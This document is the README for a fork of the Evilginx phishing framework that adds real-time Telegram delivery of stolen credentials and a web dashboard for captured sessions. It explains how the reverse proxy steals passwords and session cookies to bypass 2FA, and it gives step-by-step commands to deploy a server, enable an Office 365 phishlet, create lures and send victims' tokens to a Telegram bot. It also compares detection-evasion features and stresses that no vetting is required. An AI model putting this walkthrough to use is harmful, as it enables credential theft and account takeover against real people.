<!--
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                      🦊  E V I L G I N X 3                                ║
║                     T E L E G R A M   E D I T I O N                       ║
║                                                                            ║
║         Man-in-the-Middle Attack Framework with 2FA Bypass                ║
║                  & Real-Time Telegram Alerts                               ║
║                                                                            ║
║                  Created with ❤️ by @officialmonsterz                      ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
-->

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png"
       alt="Evilginx2 Logo"
       width="180"
       style="filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));">
</p>

<h1 align="center" style="font-family: 'Courier New', monospace; font-size: 2.5em; color: #ff6b35; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
  🦊 Evilginx3 — Telegram Edition
</h1>

<p align="center" style="font-size: 1.15em; font-weight: 500; color: #555;">
  <strong>
    Man-in-the-Middle Attack Framework with 2FA Bypass<br>
    & Real-Time Telegram Alerts
  </strong>
</p>

<br>

<p align="center">
  <a href="https://t.me/officialmonsterz">
    <img src="https://img.shields.io/badge/Telegram-@officialmonsterz-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
  </a>
  <a href="mailto:shapads@tutamail.com">
    <img src="https://img.shields.io/badge/Email-shapads@tutamail.com-red?style=for-the-badge&logo=mail.ru&logoColor=white" alt="Email">
  </a>
  <a href="https://github.com/officialmonsterz/evilginx2">
    <img src="https://img.shields.io/badge/GitHub-officialmonsterz-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
  </a>
</p>

<p align="center">
  <a href="https://github.com/officialmonsterz/evilginx2/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203--Clause-blue?style=flat-square" alt="License">
  </a>
  <img src="https://img.shields.io/badge/Version-3.3.0-brightgreen?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.22-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Database-BuntDB-orange?style=flat-square" alt="BuntDB">
  <img src="https://img.shields.io/badge/Docker-~18MB-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
</p>

<br>

---

<br>

<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png"
       alt="Evilginx2 Console"
       width="780"
       style="border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,0.25);">
</p>

<br>

---

<br>

# 📋 Table of Contents

1. [🧠 What Is Evilginx3? — Explained for Any Skill Level](#-what-is-evilginx3)
2. [⚡ Why This Fork? — What Makes It Special](#-why-this-fork)
3. [🆚 Evilginx3 Telegram Edition vs Evilginx Pro — The Full Comparison](#-evilginx3-telegram-edition-vs-evilginx-pro)
4. [📊 Full Feature Matrix — Every Feature Compared Side-by-Side](#-full-feature-matrix)
5. [🎯 Why You Should Choose This Fork (Pros) — The Honest Case](#-why-you-should-choose-this-fork)
6. [⚠️ Where Evilginx Pro Wins (Cons) — Being Transparent](#-where-evilginx-pro-wins)
7. [✨ New Features Deep Dive](#-new-features-deep-dive)
8. [🚀 Quick Start](#-quick-start)
9. [📱 Telegram Integration](#-telegram-integration)
10. [📊 Web Dashboard](#-web-dashboard)
11. [🐳 Docker Support](#-docker-support)
12. [🧬 Architecture & Data Flow](#-architecture--data-flow)
13. [📂 Complete File Reference](#-complete-file-reference)
14. [⚖️ Disclaimer](#-disclaimer)
15. [👏 Credits & Support](#-credits--support)

<br>

---

<br>

# 🧠 What Is Evilginx3?

## Imagine This Scenario

You are standing **between** two people — **Person A** (your target) and **Person B** (a real website like Microsoft Office 365). Everything Person A says to Person B, you hear. Everything Person B says back, you hear. And you can **change** the messages before passing them along.

**That's exactly what Evilginx3 does.**

Evilginx3 is a **man-in-the-middle (MITM) attack framework** used for authorized penetration testing and security assessments. It acts as a **reverse proxy** between a victim and a real website (like Office 365, Google, LinkedIn, Facebook, etc.).

## The Simple Picture

┌──────────────────────────┐
                    │      YOUR VICTIM         │
                    │  (opens an email link)   │
                    └─────────────┬────────────┘
                                  │
                                  ▼
              ┌─────────────────────────────────────┐
              │       YOUR EVILGINX SERVER          │
              │                                     │
              │   "Hello! Let me forward you to     │
              │    the real login page..."          │
              └──────┬──────────────────────┬───────┘
                     │                      │
                     ▼                      ▼
          ┌────────────────────┐  ┌────────────────────┐
          │  WHAT GETS STOLEN │  │  REAL WEBSITE      │
          │                    │  │                    │
          │  ✓ Email/Username │  │  (e.g., Office 365)│
          │  ✓ Password       │  │                    │
          │  ✓ Session Cookie │  │  Victim logs in    │
          │    (bypasses 2FA) │  │  successfully      │
          │  ✓ 2FA Code       │  └────────────────────┘
          └────────┬──────────┘
                   │
                   ▼
    ┌─────────────────────────────────────┐
    │  YOU GET INSTANT NOTIFICATION:      │
    │                                     │
    │  📱 Telegram Message                │
    │  📊 Web Dashboard                   │
    │  💾 Saved to Database               │
    └─────────────────────────────────────┘



## What This Means In Real Life

When a victim types their credentials on a phishing page served by Evilginx3:

1. **Evilginx3 forwards** the credentials to the REAL website (Microsoft, Google, etc.)
2. **The real login succeeds** — the victim sees a normal page, no suspicious errors
3. **The real website sends back** a session cookie (this is what bypasses 2FA)
4. **Evilginx3 steals** that cookie AND sends it to you
5. **You get an instant Telegram message** with the username, password, and cookie file
6. **You import the cookie** into your browser — and you're logged in as that user, **without needing their 2FA code**

This is why Evilginx is so powerful: **it doesn't just steal passwords. It steals the session**, which means even if the target has 2FA/MFA enabled, you can still access their account because you have the authenticated session cookie.

<br>

---

<br>

# ⚡ Why This Fork?

> **"The difference between a good tool and a great tool is how it fits into your workflow."**

The original Evilginx3 by Kuba Gretzky (@mrgretzky) is already a phenomenal framework — powerful, elegant, and battle-tested. But when you're running a real red team operation, you don't have time to constantly refresh a terminal window or SSH into a server to check if you've caught a session. **You need results delivered to you instantly, wherever you are.**

This fork by **[@officialmonsterz](https://t.me/officialmonsterz)** takes the already powerful Evilginx3 and supercharges it with **features that penetration testers actually need in real engagements**.

## The Core Problem This Solves

> **Problem:** Original Evilginx3 only outputs to its CLI terminal. You have to SSH in, stare at the screen, or run log tail commands to see captured sessions. In a real engagement, you're moving fast. You can't be glued to a terminal.

> **Solution:** This fork delivers captured credentials directly to your **Telegram** within seconds of capture. It also provides a **Web Dashboard** so you can browse, search, filter, and export sessions from any browser.

## Quick Comparison

| Aspect | Original Evilginx3 | This Fork (Telegram Edition) |
|:-------|:------------------:|:----------------------------:|
| **📱 Notifications** | ❌ None — must manually check CLI | ✅ **Real-time Telegram alerts** |
| **📎 Token Delivery** | ❌ No file export | ✅ **Tokens attached as `.txt` files** in Telegram |
| **🔄 Message Updates** | ❌ N/A | ✅ **Auto-edits existing message** (no spam) |
| **📊 Web Dashboard** | ❌ CLI only | ✅ **Full web UI** at port 5000 |
| **⏳ Async Processing** | ❌ Blocking operations | ✅ **Non-blocking notification queue** |
| **💾 Database** | ❌ Plain text logs | ✅ **BuntDB embedded database** — zero config |
| **🐳 Docker Build** | ❌ Single-stage, large image | ✅ **Multi-stage Alpine build** — ~18MB |
| **📤 Session Export** | ❌ Manual | ✅ **CSV/JSON export** for reporting |
| **📁 Auto-Export** | ❌ Not available | ✅ **Auto-save every session** to disk |

<br>

---

<br>

# 🆚 Evilginx3 Telegram Edition vs Evilginx Pro

**This is the comparison you're looking for.** Let's be completely transparent here. Evilginx Pro is the **paid commercial product** by Kuba Gretzky (the original creator), available exclusively to vetted red team professionals. This fork is the **free, open-source alternative** with its own set of unique advantages.

## The Big Picture

Evilginx Pro ($PAID - Subscription) ├── Created by: Kuba Gretzky (original developer) ├── Target audience: Enterprise red teams, pentesting companies ├── Price: Monthly subscription (apply via breakdev.org) ├── Availability: Vetted professionals only └── Philosophy: "Professional grade, closed source, exclusive"

Evilginx3 Telegram Edition (FREE - Open Source) ├── Created by: @officialmonsterz (community fork) ├── Target audience: All cybersecurity professionals ├── Price: FREE ├── Availability: Anyone with authorization └── Philosophy: "Democratized access, transparent, extensible"

## Detailed Comparison

### 🏗️ Architecture & Deployment

| Feature | Evilginx Pro | This Fork (Telegram Edition) |
|:--------|:------------:|:----------------------------:|
| **Client-Server Model** | ✅ Full client-server architecture (manage many servers from one terminal) | ❌ Traditional single-server model (SSH into each server) |
| **Daemon Mode** | ✅ Servers run as background daemons, auto-start on boot | ✅ Via systemd service (we show you how) |
| **Automated Server Deployment** | ✅ Deploy a server with one command (provide IP + credentials) | ❌ Manual setup required |
| **Multi-Server Management** | ✅ Control multiple servers from one Evilginx client | ❌ Must SSH into each server separately |
| **Evilginx API** | ✅ Full REST API with stealth channel on port 443, client certificate auth | ✅ REST API on dashboard port 5000 (HTTP Basic Auth) |

### 🛡️ Detection Evasion

| Feature | Evilginx Pro | This Fork (Telegram Edition) |
|:--------|:------------:|:----------------------------:|
| **Wildcard TLS Certificates** | ✅ **YES — native support** (hides hostname from certificate transparency logs) | ❌ **Not native** — but you can manually configure (see Advanced section) |
| **Botguard** | ✅ Advanced JA4 fingerprinting + browser telemetry, blocks 95% of bots | ❌ Uses traditional IP blacklist/whitelist system |
| **Website Spoofing** | ✅ Renders spoofed website content for unauthorized requests (not just redirect) | ❌ Redirects to `unauth_url` only |
| **JavaScript Obfuscation** | ✅ Auto-obfuscates injected JS via obfuscator.io (different shape every load) | ❌ Plain JS injection |
| **Evilpuppet** | ✅ Background browser generates legitimate browser telemetry to evade client-side protections | ❌ Not available |
| **Header Stripping** | ✅ Strips Evilginx artifact headers by default | ✅ Phishlet-defined header stripping |
| **Out-of-the-box Chrome Protection Evasion** | ✅ Yes | ❌ Must use custom phishlets and techniques |

### 📊 Data Storage & Access

| Feature | Evilginx Pro | This Fork (Telegram Edition) |
|:--------|:------------:|:----------------------------:|
| **Database** | ✅ SQLite (fast, robust) | ✅ BuntDB (embedded, zero-config) |
| **Telegram Notifications** | ❌ Not built-in (can be done with third-party scripts) | ✅ **Native, built-in, real-time** |
| **Telegram File Attachments** | ❌ Not built-in | ✅ **Tokens as .txt files in Telegram** |
| **Auto-Updating Telegram Messages** | ❌ Not built-in | ✅ **Edits existing message, no spam** |
| **Web Dashboard** | ❌ Not built-in | ✅ **Full HTML UI with search, filter, export** |
| **Dashboard Auto-Refresh** | ❌ Not built-in | ✅ **Auto-refreshes every 5 seconds** |
| **CSV/JSON Export** | ❌ Not built-in | ✅ **One-click export from dashboard** |
| **Session Search & Filter** | ❌ Not built-in | ✅ **Search by any field, filter by phishlet** |
| **Dark Mode** | ❌ Not built-in | ✅ **Toggleable dark/light mode** |

### 📦 Management & Usability

| Feature | Evilginx Pro | This Fork (Telegram Edition) |
|:--------|:------------:|:----------------------------:|
| **External DNS Providers** | ✅ Cloudflare, Route53, Gandi.net via API | ❌ Built-in DNS server only |
| **Multi-Domain Support** | ✅ Different domains per phishlet | ❌ Single base domain |
| **Phishlet Database** | ✅ Curated, community-maintained, downloadable from CLI | ❌ Must find/manage phishlets yourself |
| **Docker Image Size** | ❌ Not provided (manual setup) | ✅ **~18MB multi-stage Alpine image** |
| **Open Source** | ❌ Closed source (paid license) | ✅ **Fully open source (BSD 3-Clause)** |
| **Price** | 💰 Paid monthly subscription | 🆓 **FREE — always** |

<br>

---

<br>

# 📊 Full Feature Matrix

Here is every single feature compared across all three versions:

# Complete Feature Comparison Matrix

| Feature | Original Evilginx3 (Community v3.3.0) | Evilginx Pro (Paid/Closed) | This Fork (Telegram Edition) |
|----------|----------|----------|----------|
| **CORE ENGINE** | | | |
| MITM Reverse Proxy | ✅ | ✅ | ✅ |
| SSL / Let's Encrypt Autocert | ✅ | ✅ | ✅ |
| Phishlet System (YAML-based) | ✅ | ✅ | ✅ |
| Built-in DNS Server | ✅ | ✅ | ✅ |
| IP Blacklist / Whitelist | ✅ | ✅ | ✅ |
| | | | |
| **DETECTION EVASION** | | | |
| Wildcard TLS Certificates | ❌ | ✅ Native | ❌ Native |
| Botguard (JA4 + Telemetry) | ❌ | ✅ | ❌ |
| Website Spoofing | ❌ | ✅ | ❌ |
| JS Obfuscation | ❌ | ✅ | ❌ |
| Evilpuppet Browser | ❌ | ✅ | ❌ |
| Chrome Enhanced Protection Evasion | ❌ | ✅ | ❌ |
| X-Evilginx Header Stripping | ❌ | ✅ Auto | ✅ Phishlet |
| | | | |
| **NOTIFICATIONS & DELIVERY** | | | |
| 📱 Telegram Instant Alerts | ❌ | ❌ Not Built-in | ✅ Built-in |
| 📎 Token `.txt` Attachments in Telegram | ❌ | ❌ Not Built-in | ✅ Built-in |
| 🔄 Auto-Editing Messages (No Spam) | ❌ | ❌ Not Built-in | ✅ Built-in |
| ⏳ Async Notification Queue | ❌ | ❌ Not Built-in | ✅ Built-in |
| Telegram Test Command | ❌ | ❌ Not Built-in | ✅ Built-in |
| | | | |
| **WEB INTERFACE** | | | |
| 📊 Web Dashboard | ❌ CLI Only | ❌ CLI Only | ✅ Built-in |
| REST API | ❌ | ✅ Pro API (443) | ✅ Dashboard API |
| Session Search & Filter | ❌ | ❌ Not Built-in | ✅ Built-in |
| CSV / JSON Export | ❌ | ❌ Not Built-in | ✅ Built-in |
| Dark Mode UI | ❌ | ❌ Not Built-in | ✅ Built-in |
| Auto-Refresh (5s) | ❌ | ❌ Not Built-in | ✅ Built-in |
| Dashboard Basic Auth | ❌ | ❌ Not Built-in | ✅ Built-in |
| Session Deletion (UI + API) | ❌ | ❌ Not Built-in | ✅ Built-in |
| | | | |
| **DATA STORAGE** | | | |
| BuntDB Embedded Database | ✅ | ❌ Uses SQLite | ✅ |
| SQLite Database | ❌ | ✅ | ❌ |
| Auto-Export to File | ❌ | ❌ Not Built-in | ✅ Built-in |
| | | | |
| **DEPLOYMENT** | | | |
| Docker Multi-Stage (~18MB Alpine) | ❌ Single-stage | ❌ Not Provided | ✅ Built-in |
| Docker Compose | ❌ | ❌ Not Provided | ✅ Built-in |
| Client-Server Architecture | ❌ | ✅ | ❌ |
| Automated Server Deployment | ❌ | ✅ One Command | ❌ Manual |
| Multi-Server Management | ❌ | ✅ Yes | ❌ No |
| External DNS Providers | ❌ | ✅ Cloudflare, etc. | ❌ Built-in DNS |
| Multi-Domain Support | ❌ | ✅ Yes | ❌ No |
| | | | |
| **PHISHLETS** | | | |
| Official Phishlet Database | ❌ Community | ✅ Curated | ❌ Community |
| | | | |
| **PRICE & LICENSE** | | | |
| Price | 🆓 Free | 💰 Paid Monthly | 🆓 Free |
| Open Source | ✅ GPL-3.0 | ❌ Closed Source | ✅ BSD-3-Clause |
| Available to Anyone | ✅ | ❌ Vetted Only | ✅ Everyone |

<br>

---

<br>

# 🎯 Why You Should Choose This Fork

### The Honest Case for This Fork Over Evilginx Pro

| Reason | What It Means For You |
|:-------|:----------------------|
| 🆓 **It's FREE** | No monthly subscription. No credit card. No vetting process. Just code. |
| 📱 **Telegram Is Built-In** | Evilginx Pro doesn't have Telegram notifications. This is the **only** version with native Telegram support. |
| 📊 **Web Dashboard Is Built-In** | Evilginx Pro doesn't have a web dashboard. This is the **only** version with one. |
| 🔓 **Open Source** | You can see every line of code. No backdoors. No closed-source magic. You control your tool. |
| 🐳 **18MB Docker Image** | Deploy anywhere in seconds. Evilginx Pro doesn't provide Docker images. |
| 📤 **One-Click Reporting** | Export CSV/JSON directly from the dashboard. Ready for client reports. |
| 📁 **Auto-Save Sessions** | Every session is saved automatically. No data loss even if the server crashes. |
| 🛠️ **Extensible** | Want to add Discord notifications? Email alerts? Webhooks? The Telegram code shows you exactly how. |

### Who This Fork Is For

- **Individual pentesters** who want a powerful tool without paying monthly
- **Red teams** that need Telegram notifications and a web dashboard
- **Students and learners** who want to understand how MITM phishing works
- **Anyone** who prefers open-source, transparent tools

<br>

---

<br>

# ⚠️ Where Evilginx Pro Wins

### Being Completely Transparent

This fork is amazing for what it does, but **Evilginx Pro is the better choice** if you need:

| Area | Why Evilginx Pro Is Better |
|:-----|:---------------------------|
| 🛡️ **Anti-Detection** | Pro has Botguard, Evilpuppet, JS obfuscation, website spoofing, and wildcard TLS certificates built-in. This is its biggest advantage. |
| 🏢 **Enterprise Features** | Multi-server management, client-server architecture, automated deployment. Pro is designed for teams. |
| 🌐 **DNS Flexibility** | Pro supports external DNS providers (Cloudflare, Route53, Gandi). This fork uses the built-in DNS server only. |
| 📋 **Phishlet Database** | Pro has a curated, tested, and maintained phishlet database. You download from the CLI. |
| 🔄 **Updates** | Pro gets active development from the original creator. This fork is community-maintained. |
| 🎭 **Stealth** | Pro's wildcard TLS certificates + Botguard + website spoofing make it significantly harder to detect. |

### Verdict

> **If you have the budget and need maximum stealth:** Choose **Evilginx Pro**.
>
> **If you want Telegram notifications, a web dashboard, Docker, and everything for free:** Choose **this fork**.
>
> **Best of both worlds:** Use this fork for its Telegram + Dashboard features, and apply Pro's techniques (like wildcard certs, cloudflare proxying) manually — which we'll teach you.

<br>

---

<br>

# ✨ New Features Deep Dive

Let me walk you through every new feature in detail, with architecture diagrams and plain-English explanations.

<br>

## 📱 1. Telegram Notifications — The Flagship Feature

This is why most people choose this fork. When a victim submits credentials on your phishing page, you get an **instant Telegram message** with all the details.

### What Your Telegram Message Looks Like

# ✨ Session Information ✨

| Field                 | Value                                          |
| --------------------- | ---------------------------------------------- |
| 👤 **Username**       | `victim@company.com`                           |
| 🔑 **Password**       | `SuperSecret123!`                              |
| 🌐 **Landing URL**    | `https://login.yourdomain.com/abc123`          |
| 🖥️ **User Agent**    | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)...` |
| 🌍 **Remote Address** | `203.0.113.42`                                 |
| 🕒 **Created**        | `1780014345`                                   |

> 📦 **Tokens are attached as a separate file.**

### How It Works Internally (Simplified)

```text
┌──────────────────────────┐
│     SESSION CAPTURED     │
│ (credentials + tokens)   │
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│   ENQUEUE TELEGRAM JOB   │
│   (async, non-blocking)  │
│   Buffer: 100 jobs max   │
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│   PROCESS TELEGRAM JOB   │
│ (background goroutine)   │
└────────────┬─────────────┘
             │
     ┌───────┴───────┐
     ▼               ▼
┌────────────┐ ┌────────────┐
│   FIRST    │ │ SUBSEQUENT │
│  CAPTURE?  │ │  CAPTURE?  │
└─────┬──────┘ └─────┬──────┘
      │ YES          │ YES
      ▼              ▼
┌────────────────┐ ┌────────────────┐
│    SEND NEW    │ │ EDIT EXISTING  │
│ MESSAGE + FILE │ │ MESSAGE + FILE │
│ (New Telegram  │ │ (Same message  │
│ notification)  │ │   updated)     │
└────────────────┘ └────────────────┘
```

### Key Files

| File | What It Does |
|:-----|:-------------|
| `core/telegram_queue.go` | Manages the async notification queue using a buffered channel |
| `core/notify.go` | Creates `.txt` files from tokens, formats messages, sends/edits via Telegram API |
| `core/tele.go` | Low-level Telegram API calls (sendMessage, editMessage, sendDocument, editMessageMedia) |
| `core/telegram_escape.go` | Escapes special characters for MarkdownV2 formatting |
| `core/tsession.go` | Struct that defines how session data is formatted for Telegram |

<br>

## 📊 2. Web Dashboard

Access your captured sessions from any browser at `http://YOUR_SERVER_IP:5000`.

### What You See

# 🦊 Evilginx2 — Telegram Edition

### 🌙 Dark Mode

**by @officialmonsterz**

---

**🔍 Search...** | **📁 All Phishlets ▼**

**Actions:**

* 📥 Export CSV
* 📥 Export JSON
* 🔄 Refresh

---

| # | Phishlet  | Username                                          | Password    | Remote Address |
| - | --------- | ------------------------------------------------- | ----------- | -------------- |
| 1 | office365 | [ceo@megacorp.com](mailto:ceo@megacorp.com)       | Winter2024! | 203.0.113.42   |
| 2 | google    | [admin@startup.io](mailto:admin@startup.io)       | P@ssw0rd    | 198.51.100.7   |
| 3 | linkedin  | [hr@company.org](mailto:hr@company.org)           | Recruit123  | 192.0.2.88     |
| 4 | office365 | [finance@corp.net](mailto:finance@corp.net)       | Q1Report!   | 203.0.113.15   |
| 5 | facebook  | [marketing@brand.com](mailto:marketing@brand.com) | AdBuget2024 | 198.51.100.33  |

---

**◀ Previous Page** | **Page 1 of 5** | **Next ▶**

🟢 **Auto-refresh: ON**

### Dashboard Features

| Feature | What It Does |
|:--------|:-------------|
| **Search** | Type anything — username, password, IP, phishlet name — and the table filters instantly |
| **Filter by Phishlet** | Dropdown to show only sessions from a specific phishlet |
| **Export CSV** | Downloads everything as a spreadsheet-ready CSV file |
| **Export JSON** | Downloads everything as machine-readable JSON |
| **Auto-Refresh** | Updates the table every 5 seconds automatically |
| **Dark Mode** | Toggle between light and dark themes (saved in your browser) |
| **Pagination** | Navigate through hundreds of sessions |
| **Click to View Details** | Click any row to see full session data including all tokens and cookies |

### REST API Endpoints

The dashboard exposes a full REST API for programmatic access:

| Endpoint | Method | Purpose |
|:---------|:-------|:--------|
| `/api/sessions` | `GET` | List all sessions (supports `?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
| `/api/sessions/export` | `GET` | Export all sessions (`?format=csv` or `?format=json`) |
| `/api/sessions/{id}` | `GET` | Get a single session with full details and tokens |
| `/api/sessions/{id}` | `DELETE` | Delete a single session |

<br>

## 💾 3. BuntDB Embedded Database

No more parsing plain text log files. This fork uses **BuntDB** — an embedded, zero-configuration, key-value database written entirely in Go.

### Why BuntDB?

| Requirement | Plain Text Logs | MySQL/PostgreSQL | BuntDB (This Fork) |
|:------------|:---------------:|:----------------:|:------------------:|
| **Setup Time** | None | 30-60 mins | **None!** |
| **External Server** | No | Yes | **No** |
| **Dependencies** | None | Many | **None** |
| **Query Capability** | grep only | Full SQL | **JSON indexes** |
| **Backup** | cp file | mysqldump | **cp file** |
| **Memory Footprint** | 0 MB | 100+ MB | **~5 MB** |
| **Crash Recovery** | Manual | Complex | **Auto (append-only)** |
| **Concurrent Access** | ❌ No | ✅ Yes | **✅ Yes (RWMutex)** |

### Database Schema (Simplified)

Each captured session stores:
- **Id**: Auto-incremented unique ID
- **Phishlet**: Which phishlet captured it (e.g., "office365")
- **Username**: Victim's email/username
- **Password**: Victim's password
- **CookieTokens**: Session cookies (the 2FA bypass)
- **BodyTokens**: Tokens from response body
- **HttpTokens**: Tokens from HTTP headers
- **LandingURL**: The lure URL the victim visited
- **RemoteAddr**: Victim's IP address
- **UserAgent**: Browser user agent string

<br>

## 🐳 4. Multi-Stage Docker Build (~18MB)

This fork includes a production-ready multi-stage Docker build that produces a minimal ~18MB Alpine-based image.

### Build Process

# Multi-Stage Docker Build Architecture

## Stage 1: Builder

```text
┌────────────────────────────────────┐
│ FROM golang:1.22-alpine            │
│                                    │
│ • Installs: git, ca-certificates   │
│ • Downloads Go dependencies        │
│ • Compiles static binary           │
│                                    │
│ Output: /build/evilginx (~25 MB)   │
└────────────────────────────────────┘
```

⬇

## Stage 2: Runtime

```text
┌────────────────────────────────────┐
│ FROM alpine:latest                 │
│                                    │
│ • Installs: ca-certificates,       │
│   tzdata, libcap                   │
│ • Creates 'evilginx' non-root user │
│ • Copies binary from builder       │
│ • Sets cap_net_bind_service=+ep    │
│   (allows binding ports <1024)     │
│                                    │
│ FINAL IMAGE SIZE: ~18 MB           │
└────────────────────────────────────┘
```

## Build Flow

```text
┌───────────────────────────────┐
│ golang:1.22-alpine            │
│ Build Environment             │
└───────────────┬───────────────┘
                │
                ▼
      Compile Evilginx Binary
                │
                ▼
      /build/evilginx (~25 MB)
                │
                ▼
┌───────────────────────────────┐
│ alpine:latest                 │
│ Minimal Runtime Environment   │
└───────────────┬───────────────┘
                │
                ▼
     Copy Binary + Dependencies
                │
                ▼
      Final Image (~18 MB)
```

<br>

---

<br>

# 🚀 Quick Start

### Prerequisites

- **Ubuntu 20.04+ or Debian 11+ VPS** (any cloud provider — DigitalOcean, Vultr, Hetzner)
- **A registered domain** (e.g., `yourdomain.com`)
- **A Cloudflare account** (free tier)
- **A Telegram account**

### One-Line System Preparation

```bash
sudo apt update && sudo apt install wget curl git make build-essential nginx certbot python3-certbot-nginx screen fail2ban htop net-tools ufw -y


Step 1: Install Go 1.22.5

cd ~
wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
# Expected: go version go1.22.5 linux/amd64

Step 2: Clone & Build

cd ~
git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2
go mod tidy
go build -o evilginx2 .
chmod +x evilginx2

Step 3: Configure Firewall

sudo ufw allow 22/tcp
sudo ufw allow 53/udp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 5000/tcp
sudo ufw --force enable

Step 4: Fix DNS Port Conflict

sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
sudo rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | sudo tee -a /etc/resolv.conf
sudo chattr +i /etc/resolv.conf

Step 5: Run Evilginx3 with Dashboard

./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass YOUR_STRONG_PASSWORD

Step 6: Basic Configuration (inside the evilginx> prompt)


: config domain yourdomain.com
: config ipv4 external YOUR_SERVER_IP
: config autocert on
: config unauth_url https://www.google.com
: config teletoken YOUR_BOT_TOKEN
: config chatid YOUR_CHAT_ID

Step 7: Enable a Phishlet

: phishlets hostname office365 yourdomain.com
: phishlets enable office365
: lures create office365
: lures get-url 0
For a complete step-by-step deployment with every detail explained, see the DEPLOYMENT.md file.

📱 Telegram Integration
How to Set Up
Step 1: Create a Telegram Bot

Open Telegram and search for @BotFather
Send: /newbot
Choose a name (e.g., My Evilginx Notifier)
Choose a username ending in _bot (e.g., my_evilginx_bot)
Copy the bot token — looks like: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
Step 2: Get Your Chat ID

Message your bot on Telegram first
Run: curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
Find your chat ID: "chat":{"id":7545456339,...}

Step 3: Configure in Evilginx Console

: config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
: config chatid 7545456339
: test telegram


📊 Web Dashboard
Accessing the Dashboard

http://YOUR_SERVER_IP:5000
Login with the credentials you set via -dashboard-user and -dashboard-pass.

API Examples

# List all sessions
curl -u admin:password "http://YOUR_IP:5000/api/sessions"

# Search sessions
curl -u admin:password "http://YOUR_IP:5000/api/sessions?search=admin"

# Export CSV
curl -u admin:password "http://YOUR_IP:5000/api/sessions/export?format=csv" -o sessions.csv

# Delete a session
curl -u admin:password -X DELETE "http://YOUR_IP:5000/api/sessions/1"

🐳 Docker Support
Build & Run

# Build the image
docker build -t evilginx2-telegram .

# Run the container
docker run -d \
  --name evilginx2 \
  --restart unless-stopped \
  -p 53:53/udp \
  -p 80:80 \
  -p 443:443 \
  -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx2-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass mypass1234

Docker Compose

version: '3.8'
services:
  evilginx2:
    build: .
    container_name: evilginx2
    restart: unless-stopped
    ports:
      - "53:53/udp"
      - "80:80"
      - "443:443"
      - "5000:5000"
    volumes:
      - evilginx-data:/home/evilginx/.evilginx
    command: >
      -dashboard 0.0.0.0:5000
      -dashboard-user admin
      -dashboard-pass mypass1234

volumes:
  evilginx-data:

🧬 Architecture & Data Flow
Complete Data Flow — From Capture to Delivery

PHASE 1: VICTIM INTERACTS
  Victim opens phishing URL → Browser loads proxied page → Enters credentials → Submits

PHASE 2: PROXY CAPTURES
  http_proxy.go intercepts the POST request
  ├── Extracts username/password from form body or JSON
  ├── Stores in Session object
  └── Forwards request to REAL website (login succeeds)

PHASE 3: RESPONSE INTERCEPTION
  http_proxy.go intercepts the response from real website
  ├── Captures Set-Cookie headers → CookieTokens
  ├── Captures response body tokens → BodyTokens
  ├── Captures HTTP header tokens → HttpTokens
  └── Checks if all required auth tokens are captured

PHASE 4: SESSION PERSISTENCE
  If session is complete:
  ├── Save to BuntDB via database.db_session.go (CreateSession)
  └── Notify the Telegram queue

PHASE 5: TELEGRAM NOTIFICATION
  telegram_queue.go receives job → processes async
  ├── notify.go → createTxtFile(): formats tokens into JSON → writes .txt
  ├── notify.go → formatSessionMessage(): builds MarkdownV2 message
  ├── tele.go → sendTelegramNotification(): sends document with caption
  └── notify.go → stores message_id in sessionMessageMap

PHASE 6: SUBSEQUENT TOKENS (if any)
  If more tokens arrive for same session:
  ├── notify.go checks processedSessions map → already processed?
  ├── YES → look up message_id from sessionMessageMap
  └── tele.go → editMessageFile(): edits the same Telegram message

PHASE 7: DASHBOARD ACCESS
  User opens browser → http://SERVER:5000
  ├── dashboard.go → serves HTML template with inline JS
  ├── dashboard.go → returns JSON from BuntDB via REST API
  └── Frontend JS renders table, search, filter, pagination

📂 Complete File Reference

evilginx2/
│
├── main.go                          # Entry point — flags, init, start all components
│
├── core/                            # Core engine
│   ├── http_proxy.go                #    MITM reverse proxy (modified for TG)
│   ├── session.go                   #    In-memory session management
│   ├── config.go                    #    Config (includes Chatid/Teletoken)
│   ├── notify.go                    #    Telegram notification logic + file creation
│   ├── telegram_queue.go            #    Async notification queue (buffered channel)
│   ├── tele.go                      #    Low-level Telegram API calls
│   ├── telegram_escape.go           #    MarkdownV2 escaping for Telegram
│   ├── tsession.go                  #    Telegram session struct + DB reader
│   ├── dashboard.go                 #    Web dashboard (HTML + REST API)
│   ├── auto_export.go               #    Auto-export sessions to JSON/CSV
│   ├── nameserver.go                #    DNS server
│   ├── certdb.go                    #    SSL certificate management
│   ├── blacklist.go                 #    IP blacklist
│   ├── whitelist.go                 #    IP whitelist
